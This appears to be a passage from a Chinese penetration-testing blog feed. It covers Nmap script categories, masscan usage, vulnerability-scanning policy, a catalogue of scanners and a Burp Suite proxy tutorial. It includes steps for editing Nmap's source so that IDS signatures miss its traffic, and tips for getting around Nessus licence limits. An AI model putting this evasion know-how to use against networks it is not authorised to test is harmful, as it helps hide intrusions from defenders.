<h4 id="脚本分类"><a href="#脚本分类" class="headerlink" title="脚本分类"></a>脚本分类</h4><p>【vuln】漏洞检测方面：<a href="https://nmap.org/nsedoc/categories/vuln.html">vuln NSE Category</a></p>
<p>【auth】权限验证方面：<a href="https://nmap.org/nsedoc/categories/auth.html">auth NSE Category</a></p>
<p>【brute】暴力破解方面：<a href="https://nmap.org/nsedoc/categories/brute.html">brute NSE Category</a></p>
<p>【discovery】服务信息发现：<a href="https://nmap.org/nsedoc/categories/discovery.html">discovery NSE Category</a></p>
<p>【dos】DOS攻击方面：<a href="https://nmap.org/nsedoc/categories/dos.html">dos NSE Category</a></p>
<p>【exploit】漏洞利用方面：<a href="https://nmap.org/nsedoc/categories/exploit.html">exploit NSE Category</a></p>
<p>【external】外部扩展方面：<a href="https://nmap.org/nsedoc/categories/external.html">external NSE Category</a> （集成了shodanAPI）</p>
<p>【fuzzer】FUZZ测试方面：<a href="https://nmap.org/nsedoc/categories/fuzzer.html">fuzzer NSE Category</a></p>
<p>【intrusive】一些针对的服务入侵模块：<a href="https://nmap.org/nsedoc/categories/intrusive.html">intrusive NSE Category</a></p>
<p>【malware】恶意后门方面：<a href="https://nmap.org/nsedoc/categories/malware.html">malware NSE Category</a></p>
<p>【version】版本识别：<a href="https://nmap.org/nsedoc/categories/version.html">version NSE Category</a></p>
<p>以上参数都可以作为<strong>—script</strong>的通配参数，例如：<strong>—script=vuln</strong></p>
<p>-<strong>-script=all</strong> 调用所有脚本扫描</p>
<h3 id="Nmap流量特征修改"><a href="#Nmap流量特征修改" class="headerlink" title="Nmap流量特征修改"></a>Nmap流量特征修改</h3><p>现在主流的流量分析设备也将其流量加入了特征库，为了防止在探测阶段IP就被封掉，对其的流量特征做一些简单的修改有点用的。</p>
<h4 id="Win值修改"><a href="#Win值修改" class="headerlink" title="Win值修改"></a>Win值修改</h4><p>通过观察可以发现nmap在使用SYN扫描时Windows的窗口值值固定是1024。</p>
<p>（PS ：window 关键字用于检查特定的TCP窗口大小）</p>
<p><img src="https://i.loli.net/2021/10/05/HtRwjhkfT21Bc9G.jpg" alt="img"></p>
<p>下面是正常连接3389时，发送的数据包。可以看到win值明显不一样。</p>
<p><img src="https://pic2.zhimg.com/80/v2-656045f55b5adf42a0e495ff4ce92375_720w.jpg" alt="img"></p>
<p>修改<strong>tcpip.cc</strong>文件中tcp-&gt;th_win的值，查询TCP中win这个值的信息发现，默认最大为65535。所以应该在此范围内都可以。</p>
<p>但是要考虑已公开的规则，如之前大佬写的bypass emergingthreats这篇，这个就过滤了2048 1024 3072 4096。</p>
<p><img src="https://pic2.zhimg.com/80/v2-344d90cda7c57744b3e019efb7a5c819_720w.jpg" alt="img"></p>
<h4 id="关键词修改"><a href="#关键词修改" class="headerlink" title="关键词修改"></a>关键词修改</h4><p>根据规则，一个一个去修改文件即可。</p>
<p>nmap，nm，nm@p，OR sqlspider等等，主要的就是SIP文件和一些常用的脚本文件。</p>
<p>这些个就是从emergingthreats的规则中提取的。</p>
<p><img src="https://i.loli.net/2021/10/05/iTr1c9Xm53FfMtz.jpg" alt="img"></p>
<p><img src="https://i.loli.net/2021/10/05/tmnU5A21pFgPS4X.jpg" alt="img"></p>
<h4 id="UDP探测时填充值修改"><a href="#UDP探测时填充值修改" class="headerlink" title="UDP探测时填充值修改"></a>UDP探测时填充值修改</h4><p>修改<strong>osscan2.cc</strong></p>
<p>也可通过-O参数修改</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">static u8 patternbyte = 0x43; /* character &#x27;C&#x27; */ 替换为 static u8 patternbyte = 0x46; /* character &#x27;F&#x27; */</span><br></pre></td></tr></table></figure>
<p>重新编译后再去扫描，内容已经换了，长度应该也是可以调整。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">u8 packet[328]; /* 20 IP hdr + 8 UDP hdr + 300 data */</span><br></pre></td></tr></table></figure>
<p>这里还没测试，感兴趣可以自己去定义，看会不会有什么问题。</p>
<p><img src="https://i.loli.net/2021/10/05/YBiyZ3a4zIRpVtX.jpg" alt="img"></p>
<h4 id="修改脚本中的值"><a href="#修改脚本中的值" class="headerlink" title="修改脚本中的值"></a>修改脚本中的值</h4><ul>
<li>nselib/http.lua</li>
</ul>
<p>USER<em>AGENT = stdnse.get</em>script_args(‘http.useragent’)</p>
<ul>
<li>nselib/mssql.lua</li>
</ul>
<p>搜索Nmap NSE然后替换</p>
<ul>
<li>nselib/sip.lua</li>
</ul>
<p>搜索Nmap NSE然后替换</p>
<ul>
<li>scripts/http-sql-injection.nse</li>
</ul>
<p>搜索sqlspider然后替换</p>
<ul>
<li>scripts/ssl-heartbleed.nse</li>
</ul>
<p>搜索Nmap ssl-heartbleed替换</p>
<ul>
<li>nselib/rdp.lua</li>
</ul>
<p>local cookie = “mstshash=nmap”</p>
<h3 id="Nmap衍生"><a href="#Nmap衍生" class="headerlink" title="Nmap衍生"></a>Nmap衍生</h3><h4 id="Zenmap"><a href="#Zenmap" class="headerlink" title="Zenmap"></a>Zenmap</h4><p><strong>Zenmap是Nmap的官方GUI(图形界面)版本</strong>。</p>
<p><img src="https://i.loli.net/2021/10/05/Ku1R2VbmSD6f9gE.png" alt="img"></p>
<h4 id="DNmap"><a href="#DNmap" class="headerlink" title="DNmap"></a>DNmap</h4><p>dnmap是使用客户端/服务器体系结构的分布式nmap框架。 服务器从文件中读取命令，并将其发送给每个客户端。 客户端执行nmap命令并将结果发送回去。</p>
<p>下载地址：<a href="https://sourceforge.net/projects/dnmap/">https://sourceforge.net/projects/dnmap/</a></p>
<p>有关DNmap的使用可以参考：<a href="https://www.bilibili.com/read/cv5791617/">https://www.bilibili.com/read/cv5791617/</a></p>
<p><img src="https://i.loli.net/2021/10/05/JQCfYZrFNulcaV5.jpg" alt="dnmap_architecture_2"></p>
<h2 id="MasScan"><a href="#MasScan" class="headerlink" title="MasScan"></a>MasScan</h2><h3 id="MasScan的介绍"><a href="#MasScan的介绍" class="headerlink" title="MasScan的介绍"></a>MasScan的介绍</h3><p>Masscan 作为一个端口扫描工具，具备优秀的性能，能够在短时间内对大量的IP和端口进行是否开放的扫描，使用简单，相比于NMAP等工具来说更容易上手，是网络安全领域的优秀工具。Masscan使用C语言编写，核心部分使用C90编写，包含了大量TCP协议相关，以及操作系统相关的底层代码，代码注释完善，十分详尽，结构清晰，是十分值得学习的C语言网络项目。</p>
<h3 id="常用选项"><a href="#常用选项" class="headerlink" title="常用选项"></a>常用选项</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-p &lt;ports,–ports &lt;ports&gt;&gt; 		指定端口进行扫描</span><br><span class="line">-–banners 				获取banner信息，支持少量的协议</span><br><span class="line">-–rate &lt;packets-per-second&gt; 		指定发包的速率</span><br><span class="line">-c &lt;filename&gt;, --conf &lt;filename&gt; 	读取配置文件进行扫描</span><br><span class="line">–-echo 				将当前的配置重定向到一个配置文件中，可以将文件与-c选项一起使用。</span><br><span class="line">-e &lt;ifname&gt; , --adapter &lt;ifname&gt; 	指定用来发包的网卡接口名称</span><br><span class="line">–-adapter-ip &lt;ip-address&gt; 		指定发包的IP地址</span><br><span class="line">–-adapter-port &lt;port&gt; 			指定发包的源端口</span><br><span class="line">–-adapter-mac &lt;mac-address&gt; 		指定发包的源MAC地址</span><br><span class="line">–-router-mac &lt;mac address&gt; 		指定网关的MAC地址</span><br><span class="line">–-exclude &lt;ip/range&gt; 			IP地址范围黑名单，防止masscan扫描</span><br><span class="line">–-excludefile &lt;filename&gt; 		指定IP地址范围黑名单文件</span><br><span class="line">–-includefile，-iL &lt;filename&gt; 		读取一个范围列表进行扫描</span><br><span class="line">–-ping 				扫描应该包含ICMP回应请求</span><br><span class="line">–-append-output 			以附加的形式输出到文件</span><br><span class="line">-–iflist 				列出可用的网络接口，然后退出</span><br><span class="line">–-retries 				发送重试的次数，以1秒为间隔</span><br><span class="line">-–nmap 				打印与nmap兼容的相关信息</span><br><span class="line">-–http-user-agent &lt;user-agent&gt; 	设置user-agent字段的值</span><br><span class="line">-–show [open,close] 			告诉要显示的端口状态，默认是显示开放端口</span><br><span class="line">-–noshow [open,close] 			禁用端口状态显示</span><br><span class="line">-–pcap &lt;filename&gt; 			将接收到的数据包以libpcap格式存储</span><br><span class="line">-–regress 				运行回归测试，测试扫描器是否正常运行</span><br><span class="line">-–ttl &lt;num&gt; 				指定传出数据包的TTL值，默认为255</span><br><span class="line">-–wait &lt;seconds&gt; 			指定发送完包之后的等待时间，默认为10秒</span><br><span class="line">-–offline 				没有实际的发包，主要用来测试开销</span><br><span class="line">-sL 					不执行扫描，主要是生成一个随机地址列表</span><br><span class="line">–readscan &lt;binary-files&gt; 		读取从-oB生成的二进制文件，可以转化为XML或者JSON格式</span><br><span class="line">–connection-timeout &lt;secs&gt; 		抓取banners时指定保持TCP连接的最大秒数，默认是30秒</span><br><span class="line">-oX &lt;filename&gt;				输出到filename的XML。</span><br><span class="line">-oG &lt;filename&gt;				输出到filename在的grepable格式。</span><br><span class="line">-oJ &lt;filename&gt;				输出到filename在JSON格式。</span><br></pre></td></tr></table></figure>
<h3 id="常用扫描方案-1"><a href="#常用扫描方案-1" class="headerlink" title="常用扫描方案"></a>常用扫描方案</h3><ul>
<li>简单使用</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">masscan 192.168.123.0/24 -p445</span><br></pre></td></tr></table></figure>
<ul>
<li>单ip多端口</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">masscan 192.168.123.188 -p1-1024,8080,3306</span><br></pre></td></tr></table></figure>
<ul>
<li>多ip单端口</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">masscan 192.168.123.1-192.168.123.100,192.168.123.188 -p80</span><br></pre></td></tr></table></figure>
<ul>
<li>快速扫描</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">masscan 192.168.123.0/24 -p1-1024 --rate 10000</span><br></pre></td></tr></table></figure>
<ul>
<li>把当前命令的配置保存下来，然后在其他masscan命令直接引用</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">masscan 192.168.123.188 -p80,8080 --echo &gt; scan.conf</span><br><span class="line">masscan -c scan.conf --rate 1000</span><br></pre></td></tr></table></figure>
<ul>
<li>将扫描结果导出到XML文件</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">masscan 192.168.123.188 -p0-65535 -oX scan.xml</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Web安全</category>
        <category>扫描与枚举</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>漏洞扫描概述</title>
    <url>/post/2545d0b1.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="漏洞扫描的介绍"><a href="#漏洞扫描的介绍" class="headerlink" title="漏洞扫描的介绍"></a>漏洞扫描的介绍</h2><p>漏洞扫描是指基于漏洞数据库，通过扫描等手段对指定的远程或者本地计算机系统的安全脆弱性进行检测，发现可利用漏洞的一种安全检测（渗透攻击）行为。</p>
<p>漏洞扫描器是一类旨在识别操作系统和应用程序中弱点的自动化工具。</p>
<p>漏洞扫描器能够把各种安全漏洞集成在一起，自动利用这些安全漏洞对远程主机尝试攻击，从而确定目标主机是否存在这些安全漏洞。</p>
<h2 id="漏洞扫描器的使用对象"><a href="#漏洞扫描器的使用对象" class="headerlink" title="漏洞扫描器的使用对象"></a>漏洞扫描器的使用对象</h2><ul>
<li><p>黑客 / 渗透测试人员：自动化挖掘漏洞，利用有缺陷的代码、开放端口或是容易获取用户访问权限的程序进行渗透攻击。</p>
</li>
<li><p>安全运维人员：定期进行漏洞扫描并修复相应漏洞，以抵御黑客攻击，进而减少商业机密泄露与经济损失。</p>
</li>
</ul>
<h2 id="认识漏洞扫描器的局限性"><a href="#认识漏洞扫描器的局限性" class="headerlink" title="认识漏洞扫描器的局限性"></a>认识漏洞扫描器的局限性</h2><ul>
<li>只能检测出已知漏洞，无法检测出未知的漏洞（0day）</li>
<li>容易出现误报、漏检</li>
<li>在SRC漏洞挖掘中，存储型XSS不宜使用扫描器进行检测</li>
</ul>
<h2 id="漏洞评估流程"><a href="#漏洞评估流程" class="headerlink" title="漏洞评估流程"></a>漏洞评估流程</h2><h3 id="对现有设备进行定期评估"><a href="#对现有设备进行定期评估" class="headerlink" title="对现有设备进行定期评估"></a>对现有设备进行定期评估</h3><p>理想状态下，应要求每个部门都按照规范的时间表对其联网设备进行评估。</p>
<p>例如，可要求每月对下列网络和计算设备进行扫描：</p>
<ul>
<li>任何已知包含敏感数据的计算设备</li>
<li>任何必须满足特定监管要求的计算设备</li>
<li>任何作为用以构建和部署新的工作站/服务器的基本映像的文件系统映像或虚拟机模板</li>
<li>任何作用服务器或于数据存储的设备</li>
<li>任何网络基础设施设备</li>
</ul>
<p>除非另有授权，否则必须使用经批准的漏洞扫描工具进行扫描。要记住：漏洞扫描可能且必然会减慢其正在评估的网络、设备或应用程序。如果在工作时段内进行扫描，应注意尽量减少由于扫描造成的可能干扰。扫描应该在非高峰时段进行，并通过附加的二次扫描，将不合作或因关机而需要重新扫描的客户端纳入扫描。</p>
<h3 id="评估新的系统"><a href="#评估新的系统" class="headerlink" title="评估新的系统"></a>评估新的系统</h3><p>在完成漏洞评估且漏洞得到处理之前，任何新的系统都不应加入运营当中。</p>
<p>应当要求各部门在以下时机实施漏洞评估：</p>
<ul>
<li>在操作系统安装以及修补阶段完成时</li>
<li>在完成任何由供应商提供或内部开发的应用程序的安装时</li>
<li>在将信息系统投入运营之前</li>
<li>在完成用于部署于多个设备的映像或模板的设计时</li>
<li>在供应商提供信息系统交付时且用户进行验收之前，并在投入运营之前再次进行</li>
<li>对于新网络基础设备，在拷机测试阶段以及运营之前</li>
</ul>
<p>在上述每次脆弱性评估完成时，必须记录并修补所有发现的漏洞。</p>
<h3 id="理解扫描目标"><a href="#理解扫描目标" class="headerlink" title="理解扫描目标"></a>理解扫描目标</h3><p>各部门不应对不受其直接控制的系统进行侵入式扫描：</p>
<ul>
<li>各部门要求负责确保那些供应商所有的设备在可能危害企业的漏洞方面受到限制</li>
<li>供应商必须得到通知，且允许其在进行扫描时派出工作人员在场</li>
<li>未经部门和管理层的明确许可，不得允许供应商对信息系统进行扫描</li>
</ul>
<p>对那些疑似在网络上引发破坏行为的联网计算设备，应通过非侵入方式进行扫描，以追查破坏行为的源头。</p>
<h3 id="缓解风险"><a href="#缓解风险" class="headerlink" title="缓解风险"></a>缓解风险</h3><p>在每次评估结束时，各部门应编制以下内容文档：</p>
<ul>
<li>所有发现的漏洞、漏洞的严重性，以及受其影响的信息系统</li>
<li>对于每个已经发现的漏洞详细说明如何修补或消除该漏洞</li>
<li>企业漏洞扫描工具生成的报告，并应评估该报告对于编制该文档的适合性</li>
</ul>
<p>作为年度安全扫描流程的一部分，应该要求各部门将根据该文档开展的漏洞扫描与修复工作进行记录归档。</p>
<p>针对发现的漏洞，应基于一定的原则采取修复或缓解措施，例如：</p>
<ul>
<li>严重漏洞应在被发现后15天内被完全解决。</li>
<li>高危漏洞应在被发现后30天内被完全解决。</li>
<li>中危漏洞应在被发现后60天内被完全解决。</li>
<li>低危漏洞应在被发现后90天内被完全解决。</li>
</ul>
<p>当漏洞被利用的风险得到完全清除，且对设备的后续扫描显示漏洞不复存在，则可以认为漏洞已经得到修复。通常，该目标可通过对操作系统或应用系统打补丁或升级软件实现。</p>
<h2 id="可执行的扫描类型"><a href="#可执行的扫描类型" class="headerlink" title="可执行的扫描类型"></a>可执行的扫描类型</h2><ul>
<li>认证扫描：此类扫描通过对特定资质凭据进行验证来判断机器是否存在漏洞，而无需进行侵入式扫描。</li>
<li>信息系统：扫描协同运行以执行一组业务功能的软件、硬件和接口组件。</li>
<li>内部机密：扫描中具有维持特定信息仅对那些得到授权和需要了解该信息的人开放的需求。</li>
<li>侵入式扫描：通过主动执行已知的漏洞利用手段来确定漏洞存在的一种扫描方式。</li>
<li>联网计算机设备：扫描任何连接到网络用于提供访问、处理和存储信息的手段的计算设备。</li>
<li>网络基础设施设备：该类扫描针对提供信息传输功能的设备，如路由器、交换机、防护墙和桥接设备；不包括网络服务器和工作站，除非这些服务器/工作站为特定的提供网络传输的功能服务。</li>
<li>部门：扫描组织中定义的一个负责保护某个给定的信息资产的单位。</li>
</ul>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>扫描与枚举</category>
      </categories>
      <tags>
        <tag>漏洞扫描</tag>
      </tags>
  </entry>
  <entry>
    <title>系统与网络漏洞扫描器</title>
    <url>/post/57b56c16.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Nessus"><a href="#Nessus" class="headerlink" title="Nessus"></a>Nessus</h2><p>Nessus是全球使用人数最多的系统漏洞扫描与分析软件，这是一个免费、威力强大、更新频繁并简易使用的远端系统安全扫描程序，功能十分强大。</p>
<p><strong>docker安装</strong></p>
<p>Nessus有教育版和专业版。Nessus教育版最大只支持扫描16个主机,但利用docker无限使用,当然虚拟机快照也可以。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run --rm -itd -p 8834:8834 registry.cn-hangzhou.aliyuncs.com/steinven/nessus:v0.1</span><br></pre></td></tr></table></figure>
<p>注意该命令中的—rm参数，每次容器停止后会自动删除，如不想删除，去掉该参数即可</p>
<p>访问<code>https://ip:8834</code>（注意是<code>https</code>），账号：<code>admin</code>密码：<code>admin</code></p>
<p><strong>Windows安装</strong></p>
<p>有关Windows上安装Nessus的教程可以参考一下文章：</p>
<p>Windows操作系统上安装破解Nessus：<a href="https://www.cnblogs.com/x1234567890/p/14872001.html">https://www.cnblogs.com/x1234567890/p/14872001.html</a></p>
<h2 id="Ladon"><a href="#Ladon" class="headerlink" title="Ladon"></a>Ladon</h2><p>Ladon一款用于大型网络渗透的多线程插件化综合扫描神器，含端口扫描、服务识别、网络资产、密码爆破、高危漏洞检测以及一键GetShell，支持批量A段/B段/C段以及跨网段扫描，支持URL、主机、域名列表扫描。7.2版本内置94个功能模块,外部模块18个,通过多种协议以及方法快速获取目标网络存活主机IP、计算机名、工作组、共享资源、网卡地址、操作系统版本、网站、子域名、中间件、开放服务、路由器、数据库等信息，漏洞检测包含MS17010、SMBGhost、Weblogic、ActiveMQ、Tomcat、Struts2系列等，密码爆破13种含数据库(Mysql、Oracle、MSSQL)、FTP、SSH、VNC、Windows(LDAP、SMB/IPC、NBT、WMI、SmbHash、WmiHash、Winrm)、BasicAuth、Tomcat、Weblogic、Rar等，远程执行命令包含(wmiexe/psexec/atexec/sshexec/jspshell),Web指纹识别模块可识别75种（Web应用、中间件、脚本类型、页面类型）等，可高度自定义插件POC支持.NET程序集、DLL(C#/Delphi/VC)、PowerShell等语言编写的插件,支持通过配置INI批量调用任意外部程序或命令，EXP生成器可一键生成漏洞POC快速扩展扫描能力。Ladon支持Cobalt Strike插件化扫描快速拓展内网进行横向移动。</p>
<p>项目地址：<a href="https://github.com/k8gege/Ladon">https://github.com/k8gege/Ladon</a></p>
<p>使用文档：<a href="https://k8gege.org/Ladon/">https://k8gege.org/Ladon/</a></p>
<h2 id="OpenVAS"><a href="#OpenVAS" class="headerlink" title="OpenVAS"></a>OpenVAS</h2><p>OpenVAS 是一个全功能的漏洞扫描器。它的功能包括非认证测试、认证测试、各种高水平和低水平的互联网和工业协议、大规模扫描的性能调整和一个强大的内部编程语言来实现任何类型的漏洞测试。</p>
<p>使用Kali Linux 进行安装、扫描教程：</p>
<p><a href="https://www.kali.org/blog/openvas-vulnerability-scanning/">https://www.kali.org/blog/openvas-vulnerability-scanning/</a></p>
<h2 id="Nexpose"><a href="#Nexpose" class="headerlink" title="Nexpose"></a>Nexpose</h2><p>Rapid7 Nexpose是一款面向大型网络组织的安全风险智能解决方案。</p>
<p>Nexpose主动支持整个漏洞管理生命周期，包括发现，检测，验证，风险分类，影响分析，报告和缓解。</p>
<p>官网地址：<a href="https://www.rapid7.com/products/nexpose/">https://www.rapid7.com/products/nexpose/</a></p>
<p>下载与安装教程：<a href="https://www.fujieace.com/hacker/rapid7-nexpose.html">https://www.fujieace.com/hacker/rapid7-nexpose.html</a></p>
<p>使用教程：<a href="https://www.yiibai.com/ethical_hacking/ethical-hacking-nexpose-analysis.html">https://www.yiibai.com/ethical_hacking/ethical-hacking-nexpose-analysis.html</a></p>
<h2 id="fscan"><a href="#fscan" class="headerlink" title="fscan"></a>fscan</h2><p>fscan是一款内网综合扫描工具，方便一键自动化、全方位漏扫扫描。</p>
<p>支持主机存活探测、端口扫描、常见服务的爆破、ms17010、redis批量写公钥、计划任务反弹shell、读取win网卡信息、web指纹识别、web漏洞扫描、netbios探测、域控识别等功能。</p>
<p>项目地址：<a href="https://github.com/shadow1ng/fscan">https://github.com/shadow1ng/fscan</a></p>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>扫描与枚举</category>
      </categories>
      <tags>
        <tag>漏洞扫描</tag>
      </tags>
  </entry>
  <entry>
    <title>Web漏洞扫描器</title>
    <url>/post/c6e2d2e0.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Burpsuite"><a href="#Burpsuite" class="headerlink" title="Burpsuite"></a>Burpsuite</h2><p>BurpSuite是用于攻击 web应用程序的集成平台。它包含了许多工具，并为这些工具设计了许多接口，以促进加快攻击应用程序的过程。所有的工具都共享一个能处理并显示HTTP消息，持久性，认证，代理，日志，警报的一个强大的可扩展的框架。</p>
<h3 id="Dashboard模块"><a href="#Dashboard模块" class="headerlink" title="Dashboard模块"></a>Dashboard模块</h3><h4 id="新建扫描"><a href="#新建扫描" class="headerlink" title="新建扫描"></a>新建扫描</h4><p>BurpSuite2021 启用了Dashboard，我们可以直接建立而不用从浏览器打开目标网站。</p>
<p><img src="https://i.loli.net/2021/10/05/cSGxqp6AC2YPsXE.png" alt="在这里插入图片描述"> <img src="https://i.loli.net/2021/10/05/CZ6UtyKg7Wj5n3f.png" alt="在这里插入图片描述"></p>
<p>默认情况下是不用设置其他的参数的。</p>
<h4 id="新建实时任务"><a href="#新建实时任务" class="headerlink" title="新建实时任务"></a>新建实时任务</h4><p>实时任务，就是每时每刻都在运行的任务，会实时接收burpsuite的数据进行处理，当然这是可以设定特定的数据进入该任务进行处理的。</p>
<p><img src="https://i.loli.net/2021/10/05/vDnUHAz9EIC57rV.png" alt="在这里插入图片描述"> <img src="https://i.loli.net/2021/10/05/oimwBcxXz9KQNbH.png" alt="在这里插入图片描述"><img src="https://i.loli.net/2021/10/05/gdrRMsYCfNU1ual.png" alt="在这里插入图片描述"></p>
<p>其他的根据情况微调。</p>
<h3 id="Proxy模块"><a href="#Proxy模块" class="headerlink" title="Proxy模块"></a>Proxy模块</h3><p>Burp Proxy 是Burp Suite以用户驱动测试流程功能的核心，通过代理模式，可以让我们拦截、查看、修改所有在客户端和服务端之间传输的数据。</p>
<h4 id="Proxy基本使用"><a href="#Proxy基本使用" class="headerlink" title="Proxy基本使用"></a>Proxy基本使用</h4><p>Burp Proxy的使用是一个循序渐进的过程，刚开始使用时，可能并不能很快就获取你所期望的结果，慢慢地当你熟悉了它的功能和使用方法，你就可以用它很好地对一个产品系统做安全能力评估。 一般使用Burp Proxy时，大体涉及环节如下：</p>
<ol>
<li>首先，确认JRE已经安装好，Burp Suite可以启动并正常运行，且已经完成浏览器的代理服务器配置。</li>
<li>打开Proxy功能中的Intercept选项卡，确认拦截功能为“Interception is on”状态，如果显示为“Intercept is off”则点击它，打开拦截功能。</li>
</ol>
<p><img src="https://i.loli.net/2021/10/05/9iOq72V6ITontGJ.png" alt="img"></p>
<ol>
<li><p>打开浏览器，输入你需要访问的URL(以 <a href="http://baike.baidu.com/">http://baike.baidu.com/</a> 为例)并回车，这时你将会看到数据流量经过Burp Proxy并暂停，直到你点击【Forward】，才会继续传输下去。如果你点击了【Drop】，则这次通过的数据将会被丢失，不再继续处理。</p>
</li>
<li><p>当Burp Suite拦截的客户端和服务器交互之后，我们可以在Burp Suite的消息分析选项卡中查看这次请求的实体内容、消息头、请求参数等信息。消息分析选项视图主要包括以下两项：</p>
</li>
</ol>
<p><img src="https://i.loli.net/2021/10/05/SDptf9LyPGimX3z.png" alt="image.png"></p>
<ol>
<li><p>Raw 这是视图主要显示web请求的raw格式，包含请求地址、http协议版本、主机头、浏览器信息、Accept可接受的内容类型、字符集、编码方式、cookie等。你可以通过手工修改这些信息，对服务器端进行渗透测试。</p>
</li>
<li><p>Hex 这个视图显示Raw的二进制内容，你可以通过hex编辑器对请求的内容进行修改。</p>
</li>
</ol>
<p>默认情况下，Burp Proxy只拦截请求的消息，普通文件请求如css、js、图片是不会被拦截的，你可以修改默认的拦截选项来拦截这些静态文件，当然，你也可以通过修改拦截的作用域、参数或者服务器端返回的关键字来控制Burp Proxy的消息拦截，这些在后面的章节中我们会进一步的学习。 所有流经Burp Proxy的消息，都会在http history记录下来，我们可以通过历史选项卡，查看传输的数据内容，对交互的数据进行测试和验证。同时，对于拦截到的消息和历史消息，都可以通过右击弹出菜单，发送到Burp的其他组件，如Spider、Scanner、Repeater、Intruder、Sequencer、Decoder、Comparer、Extender，进行进一步的测试。如下图所示： <img src="https://i.loli.net/2021/10/05/ZxsOl7a8wuH6zvM.png" alt="img"></p>
<h4 id="BurpSuite2021新特色"><a href="#BurpSuite2021新特色" class="headerlink" title="BurpSuite2021新特色"></a>BurpSuite2021新特色</h4><p>程序新增内置浏览器，可以不用设置浏览器代理，直接从Proxy选项卡下的“Open Browser”就可以使用内置的浏览器就行访问目标，而Burp suite则会默认开始拦截，而且相对于旧版的Burpsuite是直接可以拦截https的网站的。</p>
<h4 id="数据拦截与控制"><a href="#数据拦截与控制" class="headerlink" title="数据拦截与控制"></a>数据拦截与控制</h4><p>Burp Proxy的拦截功能主要由Intercept选项卡中的Forward、Drop、Interception is on/off、Action、Comment 以及Highlight构成，它们的功能分别是：</p>
<ul>
<li>Forward的功能是当你查看过消息或者重新编辑过消息之后，点击此按钮，将发送消息至服务器端。</li>
<li>Drop的功能是你想丢失当前拦截的消息，不再forward到服务器端。</li>
<li>Interception is on表示拦截功能打开，拦截所有通过Burp Proxy的请求数据；</li>
<li>Interception is off表示拦截功能关闭，不再拦截通过Burp Proxy的所有请求数据。</li>
<li>Action的功能是除了将当前请求的消息传递到Spider、Scanner、Repeater、Intruder、Sequencer、Decoder、Comparer组件外，还可以做一些请求消息的修改，如改变GET或者POST请求方式、改变请求body的编码，同时也可以改变请求消息的拦截设置，如不再拦截此主机的消息、不再拦截此IP地址的消息、不再拦截此种文件类型的消息、不再拦截此目录的消息，也可以指定针对此消息拦截它的服务器端返回消息。</li>
</ul>
<p>能是指对拦截的消息添加备注，在一次渗透测试中，你通常会遇到一连串的请求消息，为了便于区分，在某个关键的请求消息上，你可以添加备注信息。 <img src="https://i.loli.net/2021/10/05/hmz9BOkgiZXuofy.png" alt="img"></p>
<p><img src="https://i.loli.net/2021/10/05/uUEGIoqWkVmTsFx.png" alt="img"></p>
<p>除了Intercept中可以对通过Proxy的消息进行控制外，在可选项设置选项卡Options中也有很多的功能设置也可以对流经的消息进行控制和处理。</p>
<h4 id="客户端请求消息拦截"><a href="#客户端请求消息拦截" class="headerlink" title="客户端请求消息拦截"></a>客户端请求消息拦截</h4><p>客户端请求消息拦截是指拦截客户端发送到服务器端消息的相关配置选项，其界面如下：</p>
<p><img src="https://i.loli.net/2021/10/05/vXVnpGUg4TdoZN5.png" alt="image.png"></p>
<p>主要包含拦截规则配置、错误消息自动修复、自动更新Content-Length消息头三个部分。</p>
<p>如果intercept request based on the follow rules的checkbox被选中，则拦截所有符合勾选按钮下方列表中的请求规则的消息都将被拦截，拦截时，对规则的过滤是自上而下进行的。当然，我们可以根据自己的需求，通过【Up】和【Down】按钮，调节规则所在位置和排序。同时，我们可以点击【Add】添加一条规则，也可以选中一条规则，通过点击【Edit】进行编辑、点击【Remove】进行删除。当我们点击【Add】按钮时，会弹出规则添加的输入对话框，如下图：</p>
<p><img src="https://i.loli.net/2021/10/05/roMcvHOkbh4mGZ9.png" alt="img"></p>
<ol>
<li>拦截规则添加时，共包含4个输入项。Boolean opertor表示当前的规则与其他规则是与的方式（And）还是或的方式（Or）共存；Match type表示匹配类型，此处匹配类型可以基于域名、IP地址、协议、请求方法、URL、文件类型、参数, cookies, 头部或者内容, 状态码, MIME类型, HTML页面的title等。Match relationship表示此条规则是匹配还是不匹配Match condition输入的关键字。当我们输入这些信息，点击【OK】按钮，则规则即被保存。=</li>
<li>如果Automatically fix missing的checkbox被选中，则表示在一次消息传输中，Burp Suite会自动修复丢失或多余的新行。比如说，一条被修改过的请求消息，如果丢失了头部结束的空行，Burp Suite会自动添加上；如果一次请求的消息体中，URl编码参数中包含任何新的换行，Burp Suite将会移除。此项功能在手工修改请求消息时，为了防止错误，有很好的保护效果。</li>
<li>如果Automatically update Content-Length的checkbox被选中，则当请求的消息被修改后，Content-Length消息头部也会自动被修改，替换为与之相对应的值。</li>
</ol>
<h4 id="服务器端返回消息拦截"><a href="#服务器端返回消息拦截" class="headerlink" title="服务器端返回消息拦截"></a>服务器端返回消息拦截</h4><p>服务器端返回消息拦截顾名思义是指拦截服务器端返回的消息的相关配置项，其界面如下：</p>
